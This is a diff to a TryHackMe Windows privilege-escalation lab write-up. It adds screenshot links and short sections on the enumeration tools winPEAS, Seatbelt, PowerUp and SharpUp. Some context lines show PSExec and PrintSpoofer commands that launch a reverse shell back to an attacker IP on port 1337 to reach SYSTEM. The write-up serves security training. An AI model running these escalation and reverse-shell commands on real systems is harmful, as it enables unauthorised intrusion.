@@ -643,9 +643,9 @@ Then we log into the machine with our admin credentials to be able to simulation
 C:\PrivEsc\PSExec64.exe -i -u "nt authority\local service" C:\PrivEsc\reverse.exe
 ```
 
-![]()
+![Create Service Shell](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windows10privesc/Print_Spoofer_Create_Service_Shell.png)
 
-![]()
+![Service Connection](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windows10privesc/Print_Spoofer_Service_Connection.png)
 
 Now we set up another listener on our machine.
 
@@ -659,19 +659,19 @@ Then in the acquired Service shell we can use the PrintSpoofer exploit to get a 
 C:\PrivEsc\PrintSpoofer.exe -c "C:\PrivEsc\reverse.exe" -i 10.18.78.136 1337
 ```
 
-![]()
+![Create System Shell](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windows10privesc/Print_Spoofer_Create_System_Shell.png)
 
-![]()
+![System Connection](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windows10privesc/Print_Spoofer_System_Connection.png)
 
 ### Privilege Escalation Scripts
 
 In this task we have several other tools which we are free to use.
 
 **Tools included:**
-- winPEASany.exe
-- Seatbelt.exe
-- PowerUp.ps1
-- SharpUp.exe
+- winPEASany.exe [GitHub link](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS)
+- Seatbelt.exe [GitHub link](https://github.com/GhostPack/Seatbelt)
+- PowerUp.ps1 [GitHub link](https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc)
+- SharpUp.exe [GitHub link](https://github.com/GhostPack/SharpUp)
 
 *Experiment with all four tools, running them with different options. Do all of them identify the techniques used in this room?*
 
@@ -681,10 +681,43 @@ In this task we have several other tools which we are free to use.
 .\winPEASany.exe -quiet > output.txt
 ```
 
+![Win Peas Command](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windows10privesc/Priv_Esc_Scripts_Win_Peas_Command.png)
+
 We get a long list of things that is being looked for. We can see some of the vulnerabilities we have used in previous tasks such as the SAM and SYSTEM files or the alwaysinstallelevated registry key.
 
-![]()
+![Win Peas Results 1](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windows10privesc/Priv_Esc_Scripts_Win_Peas_1.png)
 
-![]()
+![Win Peas Results 2](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windows10privesc/Priv_Esc_Scripts_Win_Peas_2.png)
 
-Seatbelt
+**Seatbelt** performs a number of security oriented host-survey "safety checks" relevant from both offensive and defensive security perspectives. We can run it using various commands:
+
+```cmd
+Seatbelt.exe user
+Seatbelt.exe system
+Seatbelt.exe all
+```
+
+![Seatbelt Command](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windows10privesc/Priv_Esc_Scripts_Seatbelt_Command.png)
+
+Again we find similar things as we found before with saved credentials.
+
+![Seatbelt](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windows10privesc/Priv_Esc_Scripts_Seatbelt.png)
+
+**PowerUp** aims to be a clearinghouse of common Windows privilege escalation vectors that rely on misconfigurations. After importing the module, we can run it using:
+
+```cmd
+. .\PowerUp.ps1
+Invoke-AllChecks
+```
+
+![Power Up](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windows10privesc/Priv_Esc_Scripts_Power_Up.png)
+
+We see it lists some services we can abuse and their respective command to do so.
+
+**SharpUp** is a C# port of various PowerUp functionality. We can run the executable with:
+
+```cmd
+SharUp.exe audit
+```
+
+![Sharp Up](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windows10privesc/Priv_Esc_Scripts_Sharp_Up.png)
